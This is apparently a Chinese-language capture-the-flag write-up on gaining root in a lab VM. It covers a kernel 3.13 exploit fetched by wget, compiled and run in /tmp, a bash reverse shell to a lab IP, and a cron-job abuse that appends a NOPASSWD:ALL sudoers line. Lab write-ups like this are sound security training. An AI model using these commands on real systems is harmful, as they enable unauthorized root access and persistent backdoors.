# 提权

## 1. 内核提权

uname -a 系统信息
Linux kernel 3.13.0-32  版本较低，可能存在内核提权
![[Pasted image 20250710150624.png]]


`searchsploit linux kernel 3.13 | grep -i 'privilege Escalation'`

![[Pasted image 20250710150928.png]]

下载37292.c
本地 `sudo php -S 0:80` 开启web服务

靶机 SSH 服务，会话有时间限制，并且 /tmp 目录下文件会被定时清除

构造以下Playload:
```bash
wget http://192.168.240.128/37292.c -O /tmp/37292.c; 
chmod +x /tmp/37292.c; 
gcc /tmp/37292.c -o /tmp/37292; 
chmod +x /tmp/37292; 
/tmp/37292

wget http://192.168.240.128/37292.c -O /tmp/37292.c; chmod +x /tmp/37292.c; gcc /tmp/37292.c -o /tmp/37292; chmod +x /tmp/37292; /tmp/37292
```

**提权成功**
![[Pasted image 20250710151824.png]]

 `/bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.240.128/4445 0>&1‘`
## 2.计时任务提权
python -c "import pty;pty.spawn('/bin/bash')"

每过一段时间，我们的 ssh连接就会被终端，应该存在计时任务
![[Pasted image 20250710175019.png]]

直接查看计时任务，权限不够
![[Pasted image 20250710174928.png]]

查找一下日志
![[Pasted image 20250710174848.png]]

查找该计时任务为每2分钟以 **root** 权限 删除/tmp目录下所有文件，且当前overflow用户具有 `rwx` 权限，可以修改文件以提权
![[Pasted image 20250710175357.png]]

将用户 **overflow** 配置无密码执行sudo权限，提权成功

`echo "overflow ALL = (ALL)NOPASSWD:ALL" >> /etc/sudoers`

# 总结与思考

这台靶机开放了21,22,80端口，80 初始访问只有两张图片，没有有价值的信息。21端口存在 anonymous 匿名登录，ftp服务器上又一个lol.pacp流量包，用户数据有提到 serect_stuff.txt，获得了一个关键字符串 `sup3rs3cr3tdirlol` 没啥登录界面，尝试路径拼接，访问 Web 后根据提示，拿到 ssh 的用户名和密码，连接获得初始权限，但会话一直被断掉，Troll 内核版本较低，找到了一个内核提权，本地开web服务，上传脚本至 /tmp 目录下，但发现 /tmp 目录下文件会被定时删除，所以用 '**&**',  ' **;** ' 拼接命令，快速运行提权脚本，成功拿到 root 权限，查看后发现有两个定时任务，一个每5分钟删除用户overflow的所有进程，一个每2分钟删除 /tmp 路径下所有文件
